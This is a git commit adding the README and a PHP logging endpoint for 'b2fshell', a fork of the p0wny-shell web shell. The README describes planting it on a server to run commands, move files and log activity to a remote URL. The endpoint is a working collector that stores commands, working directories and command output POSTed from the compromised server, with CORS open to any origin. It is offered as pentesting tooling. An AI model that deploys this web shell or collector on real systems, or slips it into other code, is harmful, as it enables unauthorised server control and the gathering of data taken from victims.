cf354a716fbe42f45c821d973eeda430733414ae
boba2fett <boba2002fett@gmail.com>
2020-06-17 15:56:22 +0200

    cleanup

---
+++ README.md
@@ -0,0 +1,24 @@
+# b2fshell:~# -- Single-file PHP Shell
+
+b2fshell:~# is a very basic, single-file, PHP shell. It can be used to quickly execute commands on a server when pentesting a PHP application. Use it with caution: this script represents a security risk for the server.
+
+**This is Spar.. a Fork** from [flozz/p0wny-shell](https://github.com/flozz/p0wny-shell)
+
+**Features:**
+
+* Command history (using arrow keys `↑` `↓`)
+* Auto-completion of command and file names (using `Tab` key)
+* Navigate on the remote file-system (using `cd` command)
+* Upload a file to the server (usig `upload <destination_file_name>` command)
+* Download a file from the server (using `download <file_name>` command)
+* Log everything you do (`LOGURL -> b2fshell_log.php` (on remote server))
+
+**WARNING:** THIS SCRIPT IS A SECURITY HOLE. **DO NOT** UPLOAD IT ON A SERVER UNTIL YOU KNOW WHAT YOU ARE DOING!
+
+## Changelog
+
+* **2020-06-05:** Added Log feature, specify the LOGURL to the location of b2fshell_log.php and have fun
+
+## TODO
+* Adding a local python interface
+* Adding a certain degree of automation for information gathering
---
+++ b2fshell_log.php
@@ -0,0 +1,47 @@
+<?php
+
+header('Access-Control-Allow-Origin: *');//make answer accessible by the server running the webshell
+header('Access-Control-Allow-Methods: GET, POST');
+header("Access-Control-Allow-Headers: X-Requested-With");
+
+
+function featureLog($out, $cwd, $cmd) {
+    $date = date('Y').'-'.date('m').'-'.date('d');
+    $time=date('H').'-'.date('i').'-'.date('s'); //could collide with two request in one second, if this matters consider .'-'.date('v')
+    mkdir('p0wny_log/');
+    mkdir('p0wny_log/'.$date.'/');
+    $fcmd = @fopen('p0wny_log/'.$date.'/'.$time.'_cmd', 'w');
+    $fout = @fopen('p0wny_log/'.$date.'/'.$time.'_out', 'w');
+
+
+    if ($fcmd === FALSE || $fout === FALSE) {//change this to write anyway to lose no data for information gathering
+        return array(
+            'stdout' => array('Could Not Log')
+        );
+    } else {
+        fwrite($fcmd, $cwd.' '.$cmd);
+        fclose($fcmd);
+
+        fwrite($fout, $out);
+        fclose($fout);
+        return array(
+            'stdout' => array('Logged')
+        );
+    }
+}
+
+
+if (isset($_GET["feature"])) {
+
+    $response = NULL;
+
+    switch ($_GET["feature"]) {//add more features maybe in addition with the download or upload function
+        case 'log':
+            $response = featureLog($_POST['out'], $_POST['cwd'], $_POST['cmd']);
+    }
+
+    header("Content-Type: application/json");
+    echo json_encode($response);
+    die();
+}
+?>
